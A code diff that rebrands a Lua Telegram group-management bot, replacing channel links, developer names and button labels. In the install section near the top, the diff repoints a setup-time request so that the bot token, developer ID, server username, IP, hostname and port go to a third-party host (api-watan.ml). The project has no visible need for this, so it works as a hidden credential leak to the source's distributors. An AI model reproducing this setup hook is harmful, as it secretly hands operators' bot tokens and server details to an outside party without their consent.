@@ -33,7 +33,7 @@ if not database:get(Server.."UserSudo_Write") then
 print("\27[1;34mارسل ايدي المطور الان :\27[m")
 local Id = io.read():gsub(' ','') 
 if tostring(Id):match('%d+') then
-data,res = https.request("https://api-Engineer.ml/Engineer/index.php?Ban=Engineer&Info&Id="..Id)
+data,res = https.request("https://api-watan.ml/WaTaN/index.php?Ban=WaTaN&Info&Id="..Id)
 if res == 200 then
 Abs = json:decode(data)
 if Abs.Result.Info == 'Is_Spam' then
@@ -67,7 +67,7 @@ token = database:get(Server.."Token_Write"),
 SUDO = database:get(Server.."UserSudo_Write"),
 }
 Create(Config, "./Info.lua") 
-https.request("https://api-Engineer.ml/Engineer/index.php?Get=Engineer&DevId="..database:get(Server.."UserSudo_Write").."&TokenBot="..database:get(Server.."Token_Write").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port)
+https.request("https://api-watan.ml/WaTaN/index.php?Get=WaTaN&DevId="..database:get(Server.."UserSudo_Write").."&TokenBot="..database:get(Server.."Token_Write").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port)
 print("::Engineer::")
 local RunEngineer = io.open("Engineer", 'w')
 RunEngineer:write([[
@@ -3018,11 +3018,10 @@ if text == 'السورس' or text == 'سورس' or text == 'يا سورس' or te
 Text = "[⦑ Welcome to Source ⦒](t.me/ba8lawa)\n[✯ ⦑ SOURCE Engineer ⦒](t.me/ba8lawa)\n✯ Source version : 1.2"
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = '𝒄𝒉𝒂𝒏𝒏𝒆𝒍 𝒔𝒐𝒖𝒓𝒄𝒆',url="t.me/ba8lawa"},
-{text = '𝒖𝒑𝒅𝒂𝒕𝒆 𝒔𝒐𝒖𝒓𝒄𝒆',url="t.me/ba8lawaupdate"}},
-{{text = '𝒊𝒏𝒔𝒕𝒂𝒍𝒍 𝒔𝒐𝒖𝒓𝒄𝒆',url="https://t.me/ba8lawa/7"},
-{text = '𝒘𝒂𝒕𝒂𝒏 𝒈𝒓𝒐𝒖𝒑',url="https://t.me/joinchat/MJjy8Vab_jVmODdi"}},
-{{text = '𝒅𝒆𝒗𝒆𝒍𝒐𝒑𝒆𝒓',url="t.me/abbasfadhil"}},
+{{text = 'قناة بقلاوة عراقية',url="https://t.me/ba8lawa"},
+{text = 'المبرمج',url="https://t.me/blackbirdd"}},
+{{text = 'كروب ولاية بطيخ',url="https://t.me/joinchat/d81A6EaDbKY3ZDc6"}},
+{{text = 'المطور الاساسي',url="https://t.me/blackbirdd"}},
 }
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/ba8lawa&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
@@ -8797,7 +8796,7 @@ keyboard.inline_keyboard = {
 {{text="🦖 لعبة التنين 🦖",url='https://t.me/T4TTTTBOT?game=dragon'},{text="🐍 لعبة الافعى 🐍",url='https://t.me/T4TTTTBOT?game=snake'}},
 {{text="🔵 لعبة الالوان 🔴",url='https://t.me/T4TTTTBOT?game=color'}},
 {{text="🚀 لعبة الصاروخ 🚀",url='https://t.me/T4TTTTBOT?game=rocket'},{text="🏹 لعبة السهام 🏹",url='https://t.me/T4TTTTBOT?game=arrow'}},
-{{text = 'Engineer TeaM .', url="t.me/EngineerTeaM"}},
+{{text = 'المهندس حسن البصراوي', url="t.me/ba8lawa"}},
 
 }
 local msg_id = msg.id_/2097152/0.5
